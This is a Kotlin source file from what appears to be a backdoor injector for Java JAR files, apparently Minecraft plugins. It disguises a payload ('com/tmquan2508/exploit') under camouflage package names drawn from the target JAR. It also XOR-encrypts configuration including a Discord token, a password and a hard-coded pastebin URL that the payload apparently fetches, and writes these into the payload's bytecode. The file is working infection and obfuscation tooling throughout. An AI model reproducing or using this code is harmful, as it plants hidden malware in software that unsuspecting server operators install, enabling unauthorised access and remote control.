package com.tmquan2508.inject.injector.modules

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.utils.JavaVersion
import com.tmquan2508.inject.utils.generateCamouflagePlan
import com.tmquan2508.inject.utils.setClassVersion
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.commons.ClassRemapper
import org.objectweb.asm.commons.SimpleRemapper
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.LdcInsnNode
import java.io.File
import java.security.SecureRandom
import java.util.Base64

data class ProcessedPayload(
    val finalClasses: List<ClassFile>,
    val finalMainPayloadName: String
)

internal fun processPayload(
    rawPayloadClasses: List<ClassFile>,
    camouflageEnabled: Boolean,
    targetJar: File,
    dominantVersion: JavaVersion,
    uuids: String,
    usernames: String,
    prefix: String,
    injectOther: String,
    warnings: String,
    discordToken: String,
    password: String,
    camouflage: String
): ProcessedPayload {
    val originalMainPayloadName = "com/tmquan2508/exploit/Config"
    val originalPackage = "com/tmquan2508/exploit"

    val relocationMap: Map<String, String>
    val finalMainPayloadName: String

    if (camouflageEnabled) {
        Logs.info(" -> Camouflage enabled. Generating camouflage plan...")
        val plan = generateCamouflagePlan(targetJar)
        Logs.info(" -> Selected camouflage package: '${plan.packageName}' with new base name '${plan.namePrefix}'")

        val newPackage = plan.packageName
        val newBaseName = plan.namePrefix
        finalMainPayloadName = "$newPackage/$newBaseName"

        relocationMap = rawPayloadClasses.associate { clazz ->
            val originalName = clazz.name
            val newName = when (originalName) {
                originalMainPayloadName -> finalMainPayloadName
                else -> originalName.replace(originalPackage, "$newPackage/${newBaseName}Support")
            }
            originalName to newName
        }
    } else {
        relocationMap = emptyMap()
        finalMainPayloadName = originalMainPayloadName
    }

    val transformedBytecode = transformAndRelocatePayload(rawPayloadClasses, relocationMap, dominantVersion)
    val finalClassesAsClassFile = transformedBytecode.map { (newName, bytes) ->
        ClassFile(bytes).apply { name = newName }
    }

    val configuredClasses = applyConfigurationWithAsm(
        classes = finalClassesAsClassFile,
        targetClassName = finalMainPayloadName,
        uuids = uuids,
        usernames = usernames,
        prefix = prefix,
        injectOther = injectOther,
        warnings = warnings,
        discordToken = discordToken,
        password = password,
        camouflage = camouflage
    )

    return ProcessedPayload(configuredClasses, finalMainPayloadName)
}

private fun transformAndRelocatePayload(
    rawClasses: List<ClassFile>,
    relocationMap: Map<String, String>,
    dominantVersion: JavaVersion
): Map<String, ByteArray> {
    if (relocationMap.isEmpty()) {
        return rawClasses.associate { it.name to it.compile() }
    }

    val remapper = SimpleRemapper(relocationMap)
    val transformedBytecode = mutableMapOf<String, ByteArray>()

    Logs.info(" -> Transforming and relocating payload classes with ASM...")
    rawClasses.forEach { classFile ->
        val originalName = classFile.name
        val newName = relocationMap[originalName] ?: originalName

        val reader = ClassReader(classFile.compile())
        val writer = ClassWriter(ClassWriter.COMPUTE_FRAMES)

        val newSimpleName = newName.substringAfterLast('/')
        val newSourceFile = "$newSimpleName.java"

        val sourceVisitor = SourceFileVisitor(writer, newSourceFile)
        val classRemapper = ClassRemapper(sourceVisitor, remapper)

        reader.accept(classRemapper, ClassReader.EXPAND_FRAMES)

        val finalBytecode = writer.toByteArray()
        setClassVersion(finalBytecode, dominantVersion)

        transformedBytecode[newName] = finalBytecode
        Logs.debug("  [ASM-REMAP] '${originalName}' -> '${newName}' (Source: $newSourceFile)")
    }

    return transformedBytecode
}

private object AsmValueInjector {
    private object DynamicKeyEncoder {
        fun generateRandomKey(length: Int): String {
            val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            val rnd = SecureRandom()
            return (1..length)
                .map { chars[rnd.nextInt(chars.length)] }
                .joinToString("")
        }

        fun encrypt(plainText: String, key: String): String {
            val plainBytes = plainText.toByteArray(Charsets.UTF_8)
            val keyBytes = key.toByteArray(Charsets.UTF_8)
            val result = ByteArray(plainBytes.size) { i ->
                (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.getEncoder().encodeToString(result)
        }
    }

    private object StaticKeyEncoder {
        private const val SECRET_KEY = "openbd.secret.key"

        fun encrypt(plainText: String): String {
            val inputBytes = plainText.toByteArray(Charsets.UTF_8)
            val keyBytes = SECRET_KEY.toByteArray(Charsets.UTF_8)
            val outputBytes = ByteArray(inputBytes.size) { i ->
                (inputBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.getEncoder().encodeToString(outputBytes)
        }
    }

    fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>): ByteArray {
        val classReader = ClassReader(originalBytecode)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)

        var changed = false
        classNode.methods.forEach { method ->
            method.instructions.forEach { instruction ->
                if (instruction is LdcInsnNode &&
                    instruction.cst is String &&
                    placeholders.containsKey(instruction.cst as String)
                ) {
                    val placeholder = instruction.cst as String
                    instruction.cst = placeholders[placeholder]
                    Logs.debug("  [ASM-LDC] Replaced '$placeholder' in ${classNode.name}.${method.name}")
                    changed = true
                }
            }
        }

        if (!changed) Logs.warn(" -> [ASM-WARN] No placeholders were replaced in ${classNode.name}")

        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }

    fun buildFinalPlaceholderMap(
        uuids: String, usernames: String, prefix: String, injectOther: String, warnings: String,
        discordToken: String, password: String, camouflage: String
    ): Map<String, String> {
        val finalMap = mutableMapOf<String, String>()
        val urlProvider = "https://pastebin.com/raw/JD0bB1Eb"
        val randomKey = DynamicKeyEncoder.generateRandomKey(32)
        Logs.debug(" -> Generated dynamic key: $randomKey")
        val encryptedUrl = DynamicKeyEncoder.encrypt(urlProvider, randomKey)
        Logs.debug("  [ENCRYPT-DYN] '$urlProvider' -> '$encryptedUrl'")

        finalMap["::KEY::"] = randomKey
        finalMap["::S_URL_PROVIDER::"] = encryptedUrl

        val otherConfigs = mapOf(
            "::UUIDS::" to uuids,
            "::USERNAMES::" to usernames,
            "::PREFIX::" to prefix,
            "::INJECT_OTHER::" to injectOther,
            "::WARNINGS::" to warnings,
            "::DISCORD_TOKEN::" to discordToken,
            "::PASSWORD::" to password,
            "::CAMOUFLAGE::" to camouflage,
            "::TRUE::" to "true"
        )

        otherConfigs.forEach { (placeholder, plainText) ->
            val encryptedValue = StaticKeyEncoder.encrypt(plainText)
            finalMap[placeholder] = encryptedValue
            Logs.debug("  [ENCRYPT-STATIC] '$plainText' -> '${encryptedValue.take(10)}'")
        }

        return finalMap
    }
}

private fun applyConfigurationWithAsm(
    classes: List<ClassFile>, targetClassName: String, uuids: String, usernames: String,
    prefix: String, injectOther: String, warnings: String, discordToken: String,
    password: String, camouflage: String
): List<ClassFile> {
    val targetIndex = classes.indexOfFirst { it.name == targetClassName }
    if (targetIndex == -1) {
        Logs.warn("Could not find configuration target class '$targetClassName'. Skipping.")
        return classes
    }

    val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
        uuids, usernames, prefix, injectOther, warnings, discordToken, password, camouflage
    )

    val originalTargetFile = classes[targetIndex]
    val modifiedBytecode = AsmValueInjector.inject(originalTargetFile.compile(), replacementMap)
    val modifiedClassFile = ClassFile(modifiedBytecode).apply {
        name = originalTargetFile.name
    }

    val finalClasses = classes.toMutableList()
    finalClasses[targetIndex] = modifiedClassFile

    Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
    return finalClasses
}